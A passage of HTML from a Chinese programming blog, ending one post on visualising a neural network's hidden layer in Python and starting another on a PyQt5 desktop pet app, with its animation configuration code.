class="number">0.30228635</span>  <span class="number">0.30228635</span>]</span><br><span class="line"> [ <span class="number">0.16784019</span>  <span class="number">0.20149903</span>]</span><br><span class="line"> [ <span class="number">0.16341919</span>  <span class="number">0.19979109</span>]</span><br><span class="line"> [ <span class="number">0.16182059</span>  <span class="number">0.16746539</span>]</span><br><span class="line"> [ <span class="number">0.13164304</span>  <span class="number">0.10137094</span>]</span><br><span class="line"> [ <span class="number">0.12980928</span>  <span class="number">0.09145231</span>]</span><br><span class="line"> [ <span class="number">0.09959317</span>  <span class="number">0.09959317</span>]</span><br><span class="line"> [ <span class="number">0.06275198</span>  <span class="number">0.08903145</span>]</span><br><span class="line"> [ <span class="number">0.06814118</span>  <span class="number">0.10771551</span>]</span><br><span class="line"> [ <span class="number">0.06010838</span>  <span class="number">0.07659312</span>]</span><br><span class="line"> [ <span class="number">0.03765248</span>  <span class="number">0.01589163</span>]</span><br><span class="line"> [ <span class="number">0.02937856</span> <span class="number">-0.01062105</span>]</span><br><span class="line"> [ <span class="number">0.09693242</span>  <span class="number">0.09693242</span>]</span><br><span class="line"> [ <span class="number">0.057304</span>    <span class="number">0.07411068</span>]</span><br><span class="line"> [ <span class="number">0.06636988</span>  <span class="number">0.10599418</span>]</span><br><span class="line"> [ <span class="number">0.06353249</span>  <span class="number">0.089544</span>  ]</span><br><span class="line"> [ <span class="number">0.04192228</span>  <span class="number">0.03040615</span>]</span><br><span class="line"> [ <span class="number">0.02820396</span> <span class="number">-0.01025194</span>]]</span><br></pre></td></tr></table></figure>
<ul>
<li>左边是用我们的代价函数，计算出来的梯度</li>
<li>右边是用数学方法，计算出来的梯度</li>
<li>通过对比两者的差值，我们可以大体判断一下该代价函数的效果如何</li>
</ul>
<h2 id="Visualizing-the-hidden-layer（可视化隐藏层）"><a href="#Visualizing-the-hidden-layer（可视化隐藏层）" class="headerlink" title="Visualizing the hidden layer（可视化隐藏层）"></a>Visualizing the hidden layer（可视化隐藏层）</h2><p>理解神经网络学习内容的一种方法是可视化隐藏单元捕获的表示</p>
<p>非正式地说，给定一个特定的隐藏单元，可视化其计算内容的一种方法是找到一个将使其激活的输入“x”</p>
<p>实现如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======================= 5.可视化系数和预测 ===================================</span></span><br><span class="line"></span><br><span class="line">display_data(theta1[:, <span class="number">1</span>:]) <span class="comment"># 和之前实验使用的display_data一样</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">pred = predict_nn(X,theta1, theta2) <span class="comment"># 预测神经网络</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training set accuracy: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(np.mean(pred == Y)*<span class="number">100</span>)) <span class="comment"># 计算该模型的准确度</span></span><br></pre></td></tr></table></figure>
<ul>
<li>实现的原理简单粗暴，直接把输入层输出的激活值放入 display_data 描述数据</li>
<li>注意：上一层输出的激活值，会被当做下一层的输出的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_data</span>(<span class="params">x</span>):</span></span><br><span class="line">	(m,n) = x.shape</span><br><span class="line">	<span class="comment"># 设置每个小图例的宽度和高度</span></span><br><span class="line">	width = np.<span class="built_in">round</span>(np.sqrt(n)).astype(<span class="built_in">int</span>)</span><br><span class="line">	height = (n / width).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 设置图片的行数和列数</span></span><br><span class="line">	rows = np.floor(np.sqrt(m)).astype(<span class="built_in">int</span>)</span><br><span class="line">	cols = np.ceil(m / rows).astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 设置图例之间的间隔</span></span><br><span class="line">	pad = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 初始化图像数据</span></span><br><span class="line">	display_array = -np.ones((pad + rows*(height+pad), pad + cols*(width + pad)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 把数据按行和列复制进图像中(10x10的表格)</span></span><br><span class="line">	current_image = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">			<span class="keyword">if</span> current_image &gt; m:</span><br><span class="line">				<span class="keyword">break</span> </span><br><span class="line">			max_val = np.<span class="built_in">max</span>(np.<span class="built_in">abs</span>(x[current_image,:]))</span><br><span class="line">			display_array[pad + j*(height + pad) + np.arange(height),pad + i*(width + pad) + np.arange(width)[:,np.newaxis]] = x[current_image,:].reshape((height,width)) / max_val</span><br><span class="line">			current_image += <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> current_image &gt; m :</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 显示图像</span></span><br><span class="line">	plt.figure()</span><br><span class="line">	<span class="comment"># 设置图像色彩为灰度值，指定图像坐标范围</span></span><br><span class="line">	plt.imshow(display_array,cmap = <span class="string">&#x27;gray&#x27;</span>,extent =[-<span class="number">1</span>,<span class="number">1</span>,-<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">	plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">	plt.title(<span class="string">&#x27;Random Seleted Digits&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>把输入的图像数据X进行重新排列，显示在一个面板 figurePane 中</li>
<li>面板中有多个小 imge 用来显示每一行数据</li>
</ul>
<p>描绘结果如下：</p>
<img src="/2022/05/15/Machine-Learning-Lab4/1652602690664.png" class width="1652602690664"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/" class="post-title-link" itemprop="url">不务正业系列：桌宠开发Ⅱ（偶尔更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-14 15:45:36" itemprop="dateCreated datePublished" datetime="2022-05-14T15:45:36+08:00">2022-05-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-19 22:59:50" itemprop="dateModified" datetime="2022-05-19T22:59:50+08:00">2022-05-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NoMaoWork/" itemprop="url" rel="index"><span itemprop="name">NoMaoWork</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>31k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>28 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="桌宠开发Ⅱ"><a href="#桌宠开发Ⅱ" class="headerlink" title="桌宠开发Ⅱ"></a>桌宠开发Ⅱ</h2><p>距离上一个版本的桌宠已经1个月了，最近心血来潮，想回顾一下</p>
<p>这两天写这个东西有点上瘾，通过改 BUG，我对 PyQt5 算是熟悉一些了</p>
<h2 id="DesktopPets-v2-0"><a href="#DesktopPets-v2-0" class="headerlink" title="DesktopPets_v2.0"></a>DesktopPets_v2.0</h2><p>这次的桌宠迎来大升级，右键菜单功能补全，大大提高了互动性</p>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513650364-1652972388138.png" class width="1652513650364"> 
<p>共添加了3个功能：</p>
<ul>
<li>天气预报</li>
</ul>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513706836-1652972388138.png" class width="1652513706836"> 
<ul>
<li>爬虫</li>
</ul>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513732308-1652972388138.png" class width="1652513732308"> 
<ul>
<li>图片盒子</li>
</ul>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652513811854-1652972388138.png" class width="1652513811854"> 
<p>PS：“爬虫”爬取到的图片会直接被“图片盒子”读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Attached.CallWeatherWin <span class="keyword">import</span> Mainweather</span><br><span class="line"><span class="keyword">from</span> Attached.crawler <span class="keyword">import</span> Crawler</span><br><span class="line"><span class="keyword">from</span> Attached.Blankbox <span class="keyword">import</span> MainBOX</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>], <span class="comment"># 拖动_3</span></span><br><span class="line">        [<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11f&#x27;</span>,<span class="string">&#x27;11g&#x27;</span>,<span class="string">&#x27;11e&#x27;</span>,<span class="string">&#x27;11d&#x27;</span>,<span class="string">&#x27;11c&#x27;</span>,<span class="string">&#x27;11b&#x27;</span>,<span class="string">&#x27;11a&#x27;</span>,<span class="string">&#x27;11&#x27;</span>], <span class="comment"># 打哈切_4</span></span><br><span class="line">        [<span class="string">&#x27;12&#x27;</span>, <span class="string">&#x27;13&#x27;</span>, <span class="string">&#x27;14&#x27;</span>], <span class="comment"># 爬_5</span></span><br><span class="line">        [<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>], <span class="comment"># 触地_6</span></span><br><span class="line">        [<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;21&#x27;</span>], <span class="comment"># 睡觉_7</span></span><br><span class="line">        [<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;22a&#x27;</span>], <span class="comment"># 跳跃_8</span></span><br><span class="line">        [<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23&#x27;</span>,<span class="string">&#x27;23a&#x27;</span>,<span class="string">&#x27;23b&#x27;</span>,<span class="string">&#x27;24&#x27;</span>,<span class="string">&#x27;25&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;35&#x27;</span>,<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;37&#x27;</span>], <span class="comment"># 举手_9</span></span><br><span class="line">        [<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;16&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;29&#x27;</span>,<span class="string">&#x27;15&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;17&#x27;</span>,<span class="string">&#x27;26&#x27;</span>,<span class="string">&#x27;27&#x27;</span>,<span class="string">&#x27;28&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 攻击_10</span></span><br><span class="line">        [<span 